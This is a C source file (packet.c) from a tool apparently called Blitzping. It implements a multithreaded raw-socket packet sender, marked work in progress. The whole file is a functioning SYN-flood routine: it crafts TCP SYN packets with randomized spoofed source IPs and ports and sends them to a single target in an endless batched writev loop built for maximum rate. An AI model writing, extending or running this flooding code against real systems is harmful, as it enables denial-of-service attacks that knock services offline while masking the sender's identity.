// ---------------------------------------------------------------------
// SPDX-License-Identifier: GPL-3.0-or-later
// packet.c is a part of Blitzping.
// ---------------------------------------------------------------------


#include "packet.h"

/* WORK IN-PROGRESS */


// Thread callback
// TODO: Split the packet crafting logic to another function.
// TODO: Bring thread spawning logic here to this function.
// TODO: Use xorshift
// TODO: check for POSIX_MEMLOCK
int send_packets(void *arg) {
    struct pkt_args *packet_info = (struct pkt_args *)arg;


    if (mlockall(MCL_FUTURE) == -1) {
        perror("Failed to lock memory");
        return EXIT_FAILURE;
    }

    // Initialize the seed for random number generation.
    srand(time(0));

    // Initialize an empty packet buffer on the stack and align it
    // for potentially faster access from memory.
    alignas(4) uint8_t packet_buffer[IP_PKT_MTU] = {0};


    // Make the IP and TCP header structures "point" to their
    // respective locations in the aforementioned buffer
    struct ip_hdr  *ip_header  =
        (struct ip_hdr *)packet_buffer;
    struct tcp_hdr *tcp_header =
        (struct tcp_hdr *)(packet_buffer + sizeof (struct ip_hdr));


    // Craft the static parts of our packet
    *ip_header = (struct ip_hdr){
        .ver = 4,
        .ihl = 5,
        .ttl = 128,
        .proto = IP_PROTO_TCP,
        .len = htons(sizeof (struct ip_hdr) + sizeof (struct tcp_hdr)),
        .saddr.address = htonl(packet_info->src_ip_start.address + (rand() % (packet_info->src_ip_end.address - packet_info->src_ip_start.address + 1))),
        .daddr.address = packet_info->dest_ip.address
    };

    *tcp_header = (struct tcp_hdr){
        .sport = htons(rand() % 65536),
        .dport = htons(packet_info->dest_port),
        .seqnum = rand(),
        .flags.syn = true
    };

    // TODO: See if this is required for a raw sendto()?
    /*
    struct sockaddr_in dest_info;
    dest_info.sin_family = AF_INET;
    dest_info.sin_port = tcp_header->dport;
    dest_info.sin_addr.s_addr = ip_header->daddr.address;
    size_t packet_length = ntohs(ip_header->len);
    struct sockaddr *dest_addr = (struct sockaddr *)&dest_info;
    size_t addr_len = sizeof (dest_info);
    */

    /*struct msghdr msg = {
        .msg_name = &(struct sockaddr_in){
            .sin_family = AF_INET,
            .sin_port = tcp_header->dport,
            .sin_addr.s_addr = ip_header->daddr.address
        },
        .msg_namelen = sizeof (struct sockaddr_in),
        .msg_iov = (struct iovec[1]){
            {
                .iov_base = packet_buffer,
                .iov_len = ntohs(ip_header->len)
            }
        },
        .msg_iovlen = 1
    };*/

    /*
    printf("Packet:\n");
    printf("Source IP: %s\n", inet_ntoa(*(struct in_addr*)&ip_header->saddr.address));
    printf("Destination IP: %s\n", inet_ntoa(*(struct in_addr*)&ip_header->daddr.address));
    printf("Source Port: %d\n", ntohs(tcp_header->sport));
    printf("Destination Port: %d\n", ntohs(tcp_header->dport));
    printf("TTL: %d\n", ip_header->ttl);
    printf("Header Length: %d\n", ip_header->ihl * 4); // ihl is in 32-bit words
    printf("Total Length: %d\n", ntohs(ip_header->len));
    printf("SYN Flag: %s\n", tcp_header->flags.syn ? "Set" : "Not set");
    printf("\n");
    */

    uint32_t ip_diff = packet_info->src_ip_end.address - packet_info->src_ip_start.address + 1;
    // Set the default destination address
    struct sockaddr_in dest_info = {
        .sin_family = AF_INET,
        .sin_port = tcp_header->dport,
        .sin_addr.s_addr = ip_header->daddr.address
    };

    // NOTE: Instead of using sento() or sendmmsg(), both of which
    // require a "destination info" struct, you can pre-bind your
    // socket to a fixed destination by using connect() accompanied
    // by write() or writev().  However, if you do want to change
    // your destination with every call, then it might be better
    // to use the former functions, because they'd be handling
    // this binding inside kernelspace, bypassing what would
    // otherwise be an extraneous overhead to a separate connect().
    if (connect(packet_info->sock, (struct sockaddr *)&dest_info, sizeof (dest_info)) != 0) {
        perror("Failed to bind socket to the destination address");
        return EXIT_FAILURE;
    }

    size_t packet_length = ntohs(ip_header->len);


    //int num_threads = 4; // number of threads

    //int X = UIO_MAXIOV / (packet_length * num_threads);

    // NOTE: The addresses in this array of buffers all point
    // to the same packet buffer.  This might seem wasteful at
    // first, but a benefit is that the "for-loop" part of this
    // iteration will now be able to exist in kernelspace, 
    // bypassing expensive syscalls.
    // TODO: Maybe pre-craft the changing parts of multiple packeets,
    // as to "queue" them for sending?
    struct iovec iov[UIO_MAXIOV];
    for (int i = 0; i < 37; i++) {
        iov[i].iov_base = packet_buffer;
        iov[i].iov_len = packet_length;
    }

    // For maximal performance, do the bare-minimum processing in this
    // loop.  As of now, the Kernel syscall is the bottleneck.
    for (;;) {
        // Randomize source IP and port
        ip_header->saddr.address = htonl(
            packet_info->src_ip_start.address
            + (rand() % ip_diff)
        );
        tcp_header->sport = htons(rand() % 65536);

        // Send the Packet
        /*sendto(
            packet_info->sock,
            packet_buffer,
            packet_length,
            0,
            dest_addr,
            addr_len
        );*/
        //sendmsg(packet_info->sock, &msg, 0);
        //write(packet_info->sock, packet_buffer, packet_length);
        writev(packet_info->sock, iov, 37);
        //ssize_t bytes_written = writev(packet_info->sock, iov, 37);
        //if (bytes_written == -1) {
        //    perror("writev failed");
        //}
    }



    if (munlockall() == -1) {
        perror("Failed to unlock used memory");
        return EXIT_FAILURE;
    }

    return EXIT_SUCCESS;
}


// ---------------------------------------------------------------------
// END OF FILE: packet.c
// ---------------------------------------------------------------------
